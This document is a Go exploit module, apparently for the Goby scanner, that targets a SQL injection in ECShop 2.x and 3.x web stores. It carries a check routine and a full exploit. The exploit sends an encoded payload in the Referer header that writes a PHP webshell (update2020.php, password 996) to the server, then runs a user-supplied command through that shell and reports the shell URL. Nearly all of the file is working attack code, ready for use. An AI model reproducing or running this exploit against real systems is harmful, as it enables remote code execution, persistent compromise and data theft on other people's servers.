package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ECShop 2.x_3.x sqli",
    "Level": "3",
    "Tags": null,
    "GobyQuery": "app=\"ECShop\"",
    "Description": "ECShop is a B2C independent online store system, suitable for enterprises and individuals to quickly build personalized online stores. The system is a cross-platform open source program developed based on PHP language and MYSQL database framework. In its 2017 and previous versions, there is a SQL injection vulnerability, through which malicious data can be injected, which eventually leads to arbitrary code execution vulnerabilities",
    "Product": "ECShop",
    "Homepage": "https://www.ecshop.com/",
    "Author": "sharecast.net@gmail.com",
    "Impact": "<p>It can lead to data leakage</p>",
    "Recommendation": "<p>undefined</p>",
    "References": [
        "https://github.com/vulhub/vulhub/blob/master/ecshop/xianzhi-2017-02-82239600/README.zh-cn.md"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "echo md5(2);"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": null,
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "ECShop"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10188"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/user.php?act=login"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Cookie", "PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1")
			cfg.Header.Store("Referer", "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:121:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b7661725f64756d70286d643509283129293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}554fcae493e564ee0dc75bdf2ebf94ca")
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				flag := resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "c4ca4238a0b923820dcc509a6f75849b")
				if flag {
					return true
				} else {
					cfg.Header.Store("Referer", "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:121:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b7661725f64756d70286d643509283129293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a")
					if resp1, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						return resp1.StatusCode == 200 && strings.Contains(resp1.Utf8Html, "c4ca4238a0b923820dcc509a6f75849b")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/user.php?act=login"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Cookie", "PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1")
			cfg.Header.Store("Referer", "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:321:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f496e56775a4746305a5449774d6a417563476877496977674a7a772f634768774945426c646d46734b43526655453954564673354f545a644b547367507a346e4b54733d2729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}554fcae493e564ee0dc75bdf2ebf94ca")
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					uri1 := "/update2020.php"
					cfg1 := httpclient.NewPostRequestConfig(uri1)
					cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					cfg1.Data = fmt.Sprintf("996=%s", cmd)
					if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
						if resp1.StatusCode == 200 {
							expResult.Success = true
							shell_url := expResult.HostInfo.FixedHostInfo + uri1
							expResult.Output = fmt.Sprintf("ecshop 2.x webshell is %s, password:996, res: %s", shell_url, resp1.Utf8Html)
						} else {
							cfg.Header.Store("Referer", "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:321:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f496e56775a4746305a5449774d6a417563476877496977674a7a772f634768774945426c646d46734b43526655453954564673354f545a644b547367507a346e4b54733d2729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a")
							if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
								if resp2.StatusCode == 200 {
									if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
										if resp3.StatusCode == 200 {
											expResult.Success = true
											shell_url := expResult.HostInfo.FixedHostInfo + uri1
											expResult.Output = fmt.Sprintf("ecshop 3.x webshell is %s, password:996, res: %s", shell_url, resp3.Utf8Html)
										}
									}
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
